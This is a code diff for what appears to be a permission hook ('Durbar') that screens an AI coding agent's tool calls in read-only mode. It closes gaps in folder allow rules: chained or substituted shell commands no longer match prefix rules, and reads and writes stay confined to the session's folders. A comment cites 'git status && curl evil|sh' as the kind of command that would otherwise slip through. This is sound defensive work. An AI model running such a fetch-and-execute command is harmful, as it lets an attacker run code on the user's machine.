@@ -82,14 +82,19 @@ export function folderRuleTools(rules: readonly string[] | undefined): Set<strin
   return new Set((rules ?? []).map(folderRule).filter((r): r is { tool: string } => !!r).map((r) => r.tool));
 }
 /** True when an accepted folder allow rule covers this call (then Durbar's Read-only hook has no opinion). */
+const SHELL_SYNTAX = /[;&|`<>\n\r]|\$\(|\$\{/;
+
 export function folderRuleAllows(rules: readonly string[] | undefined, toolName: string, input?: ToolInput): boolean {
   for (const r of (rules ?? []).map(folderRule)) {
     if (!r || r.tool !== toolName) continue;
     if (r.prefix === undefined && r.exact === undefined) return true;
     const cmd = input && typeof (input as Record<string, unknown>).command === 'string' ? ((input as Record<string, unknown>).command as string).trim() : undefined;
     if (cmd === undefined) continue;
+    // S1 (review #424): Durbar's own check is strict. A compound or substituted command (`git status && curl evil|sh`) never matches a
+    // prefix or exact rule here, and a prefix needs a word boundary (`git:*` does not cover `gitx`). Claude Code still checks too.
+    if (SHELL_SYNTAX.test(cmd)) continue;
     if (r.exact !== undefined && cmd === r.exact.trim()) return true;
-    if (r.prefix !== undefined && cmd.startsWith(r.prefix)) return true;
+    if (r.prefix !== undefined && (cmd === r.prefix.trim() || cmd.startsWith(r.prefix.trimEnd() + ' '))) return true;
   }
   return false;
 }
@@ -151,6 +156,13 @@ function readPaths(toolName: string, input: ToolInput, roots: readonly string[])
   return [raw];
 }
 
+/** S1 (review #424): the file a write tool changes (`Edit`, `Write`, `MultiEdit`, `NotebookEdit`) is inside the roots; unknown shapes are outside. */
+export function writeIsInsideRoots(toolName: string, input: ToolInput, roots: readonly string[] | undefined, pathCheck?: PathCheckOptions): boolean {
+  if (!roots || !roots.length || !input) return false;
+  const raw = input[toolName === 'NotebookEdit' ? 'notebook_path' : 'file_path'];
+  return typeof raw === 'string' && raw !== '' && isInsideRoots(raw, roots, pathCheck);
+}
+
 /**
  * Is a read tool call inside the session's roots? Same rule as the Copilot broker's `readIsOutside`
  * (`isInsideRoots`: `..` collapsed, symlinks resolved), with one difference: no roots given counts as OUTSIDE here,
@@ -190,7 +202,13 @@ export interface PreToolUseDeny {
  */
 export function preToolUseDecision(mode: PermissionMode, toolName: string, input?: ToolInput, roots?: readonly string[], pathCheck?: PathCheckOptions, folderAllow?: readonly string[]): PreToolUseDeny | undefined {
   if (mode === 'ask' || mode === 'allow') return undefined;
-  if (folderRuleAllows(folderAllow, toolName, input)) return undefined; // spec 061: an accepted folder allow rule; Claude decides
+  if (folderRuleAllows(folderAllow, toolName, input)) {
+    // S1 (review #424): a folder rule covers the TOOL, never files outside the session's folders: reads and writes keep the path check
+    const kind = toolKind(toolName);
+    if ((kind === 'read' && !readIsInsideRoots(toolName, input, roots, pathCheck)) || (kind === 'write' && !writeIsInsideRoots(toolName, input, roots, pathCheck)))
+      return { hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `Read-only mode: a folder rule allows ${toolName}, but not outside the session's folders` } };
+    return undefined; // spec 061: an accepted folder allow rule; Claude decides
+  }
   const d = decideTool(mode, toolName, input, roots, pathCheck);
   if (d.behavior !== 'deny') return undefined;
   return { hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: d.reason } };
